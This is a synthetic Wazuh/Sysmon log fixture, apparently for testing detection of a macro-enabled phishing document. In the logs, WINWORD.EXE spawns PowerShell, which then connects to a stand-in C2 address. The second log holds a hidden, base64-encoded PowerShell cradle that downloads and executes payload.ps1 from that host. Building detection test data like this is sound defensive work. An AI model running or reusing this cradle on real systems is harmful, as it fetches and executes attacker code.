{
  "_metadata": {
    "attack_id": "T1566.001",
    "variation": "001",
    "name": "Macro-Enabled Document Execution",
    "description": "User opens malicious Word document with VBA macro that spawns PowerShell",
    "expected_detection": "CRITICAL",
    "expected_soar": "lolbins-abuse-detection",
    "kill_chain_phase": "initial-access",
    "notes": "Classic phishing attack. Office spawning shell is always suspicious.",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 1 - Word opens malicious document",
      "sequence": 1,
      "timestamp": "2026-01-29T08:30:00.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Macro-Enabled Document Execution",
          "id": "100100",
          "mitre": {
            "id": [
              "T1566.001"
            ],
            "tactic": [
              "Initial Access"
            ],
            "technique": [
              "Macro-Enabled Document Execution"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.971376733",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:30:00.000",
              "processGuid": "{A1B2C3D4-0001-0001-0001-000000000001}",
              "processId": "4520",
              "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              "commandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Q4_Financial_Report.docm\"",
              "currentDirectory": "C:\\Users\\john.doe\\Downloads\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "hashes": "SHA256=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
              "parentProcessGuid": "{A1B2C3D4-0000-0000-0000-000000000001}",
              "parentProcessId": "3892",
              "parentImage": "C:\\Windows\\explorer.exe",
              "parentCommandLine": "C:\\Windows\\Explorer.EXE"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 1 - Word spawns PowerShell (CRITICAL indicator)",
      "sequence": 2,
      "timestamp": "2026-01-29T08:30:05.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Macro-Enabled Document Execution",
          "id": "100100",
          "mitre": {
            "id": [
              "T1566.001"
            ],
            "tactic": [
              "Initial Access"
            ],
            "technique": [
              "Macro-Enabled Document Execution"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.233314824",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:30:05.000",
              "processGuid": "{A1B2C3D4-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAMAAuADEAMAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
              "currentDirectory": "C:\\Users\\john.doe\\Downloads\\",
              "user": "CORP\\john.doe",
              "integrityLevel": "Medium",
              "hashes": "SHA256=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
              "parentProcessGuid": "{A1B2C3D4-0001-0001-0001-000000000001}",
              "parentProcessId": "4520",
              "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
              "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\john.doe\\Downloads\\Q4_Financial_Report.docm\""
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 3 - PowerShell reaches out to C2",
      "sequence": 3,
      "timestamp": "2026-01-29T08:30:06.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 3: Macro-Enabled Document Execution",
          "id": "100100",
          "mitre": {
            "id": [
              "T1566.001"
            ],
            "tactic": [
              "Initial Access"
            ],
            "technique": [
              "Macro-Enabled Document Execution"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event3",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.883418103",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "3",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 08:30:06.000",
              "processGuid": "{A1B2C3D4-0001-0001-0001-000000000002}",
              "processId": "5678",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "user": "CORP\\john.doe",
              "protocol": "tcp",
              "initiated": "true",
              "sourceIp": "10.1.1.50",
              "sourcePort": "49721",
              "destinationIp": "192.168.50.100",
              "destinationHostname": "",
              "destinationPort": "80"
            }
          }
        }
      }
    }
  ]
}